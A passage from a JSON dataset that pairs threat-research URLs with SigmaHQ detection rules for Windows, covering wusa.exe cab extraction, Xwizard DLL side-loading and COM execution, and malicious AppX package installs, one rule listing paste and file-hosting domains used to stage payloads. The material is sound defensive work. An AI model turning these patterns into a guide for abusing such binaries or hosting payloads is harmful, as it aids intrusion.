      "id": "c74c0390-3e20-41fd-a69a-128f0275a5ea",
      "related": [
        {
          "id": "59b39960-5f9d-4a49-9cef-1e4d2c1d0cb9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
      "references": [
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://www.echotrail.io/insights/search/wusa.exe/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-11-28",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "Image|endswith": "\\wusa.exe",
          "CommandLine|contains": "/extract:"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\Appdata\\Local\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml"
  },
  "691": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
    "markdown": "",
    "sigma_rule": {
      "title": "Xwizard.EXE Execution From Non-Default Location",
      "id": "193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1",
      "status": "test",
      "description": "Detects the execution of Xwizard tool from a non-default directory.\nWhen executed from a non-default directory, this utility can be abused in order to side load a custom version of \"xwizards.dll\".\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
        "http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-09-20",
      "modified": "2024-08-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\xwizard.exe"
          },
          {
            "OriginalFileName": "xwizard.exe"
          }
        ],
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Windows installed on non-C drive"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_xwizard_execution_non_default_location.yml"
  },
  "692": {
    "url": "http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/",
    "markdown": "",
    "sigma_rule": {
      "title": "Xwizard.EXE Execution From Non-Default Location",
      "id": "193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1",
      "status": "test",
      "description": "Detects the execution of Xwizard tool from a non-default directory.\nWhen executed from a non-default directory, this utility can be abused in order to side load a custom version of \"xwizards.dll\".\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
        "http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-09-20",
      "modified": "2024-08-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\xwizard.exe"
          },
          {
            "OriginalFileName": "xwizard.exe"
          }
        ],
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Windows installed on non-C drive"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_xwizard_execution_non_default_location.yml"
  },
  "693": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
    "markdown": "",
    "sigma_rule": {
      "title": "COM Object Execution via Xwizard.EXE",
      "id": "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
      "status": "test",
      "description": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
        "https://www.elastic.co/guide/en/security/current/execution-of-com-object-via-xwizard.html",
        "https://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
      ],
      "author": "Ensar Şamil, @sblmsrsn, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-07",
      "modified": "2024-08-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine": "RunWizard",
          "CommandLine|re": "\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_xwizard_runwizard_com_object_exec.yml"
  },
  "694": {
    "url": "https://www.elastic.co/guide/en/security/current/execution-of-com-object-via-xwizard.html",
    "markdown": "",
    "sigma_rule": {
      "title": "COM Object Execution via Xwizard.EXE",
      "id": "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
      "status": "test",
      "description": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
        "https://www.elastic.co/guide/en/security/current/execution-of-com-object-via-xwizard.html",
        "https://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
      ],
      "author": "Ensar Şamil, @sblmsrsn, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-07",
      "modified": "2024-08-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine": "RunWizard",
          "CommandLine|re": "\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_xwizard_runwizard_com_object_exec.yml"
  },
  "695": {
    "url": "https://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/",
    "markdown": "",
    "sigma_rule": {
      "title": "COM Object Execution via Xwizard.EXE",
      "id": "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
      "status": "test",
      "description": "Detects the execution of Xwizard tool with the \"RunWizard\" flag and a GUID like argument.\nThis utility can be abused in order to run custom COM object created in the registry.\n",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/",
        "https://www.elastic.co/guide/en/security/current/execution-of-com-object-via-xwizard.html",
        "https://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/"
      ],
      "author": "Ensar Şamil, @sblmsrsn, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-07",
      "modified": "2024-08-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine": "RunWizard",
          "CommandLine|re": "\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_xwizard_runwizard_com_object_exec.yml"
  },
  "696": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Potential Malicious AppX Package Installation Attempts",
      "id": "09d3b48b-be17-47f5-bf4e-94e7e75d09ce",
      "status": "test",
      "description": "Detects potential installation or installation attempts of known malicious appx packages",
      "references": [
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-01-12",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            400,
            401
          ],
          "PackageFullName|contains": "3669e262-ec02-4e9d-bcb4-3d008b4afac9"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Rare occasions where a malicious package uses the exact same name and version as a legtimate application"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_mal_appx_names.yml"
  },
  "697": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Potential Malicious AppX Package Installation Attempts",
      "id": "09d3b48b-be17-47f5-bf4e-94e7e75d09ce",
      "status": "test",
      "description": "Detects potential installation or installation attempts of known malicious appx packages",
      "references": [
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-01-12",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            400,
            401
          ],
          "PackageFullName|contains": "3669e262-ec02-4e9d-bcb4-3d008b4afac9"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Rare occasions where a malicious package uses the exact same name and version as a legtimate application"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_mal_appx_names.yml"
  },
  "698": {
    "url": "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/",
    "markdown": "# Analyzing a Magnitude EK Appx Package Dropping Magniber **Posted**: Jan 2, 2022 **Updated**: Mar 29, 2022 In this post I’ll work through analyzing an AppX package from Magnitude Exploit Kit that drops Magniber. This adventure comes courtesy of a tweet from @JAMESWT_MHT. This caught my interest because AppX packages have gotten some mileage as droppers lately courtesy of Bazar and Emotet. - BazarLoader Call Me Back Attack Abuses Windows 10 Apps Mechanism - Intelligence Insights December 2021 If you want to play along from home, the file I’m analyzing is here: Sample File ## Analyzing the AppX Package To",
    "sigma_rule": {
      "title": "Potential Malicious AppX Package Installation Attempts",
      "id": "09d3b48b-be17-47f5-bf4e-94e7e75d09ce",
      "status": "test",
      "description": "Detects potential installation or installation attempts of known malicious appx packages",
      "references": [
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-01-12",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            400,
            401
          ],
          "PackageFullName|contains": "3669e262-ec02-4e9d-bcb4-3d008b4afac9"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Rare occasions where a malicious package uses the exact same name and version as a legtimate application"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_mal_appx_names.yml"
  },
  "699": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml"
  },
  "700": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml"
  },
  "701": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps Use these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer. > **Note** > This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support. ## Get diagnostic information When an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs. To access the packaging and",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml"
  },
  "702": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml"
  },
  "703": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml"
  },
  "704": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml"
  },
  "705": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps Use these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer. > **Note** > This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support. ## Get diagnostic information When an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs. To access the packaging and",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml"
  },
  "706": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml"
  },
  "707": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
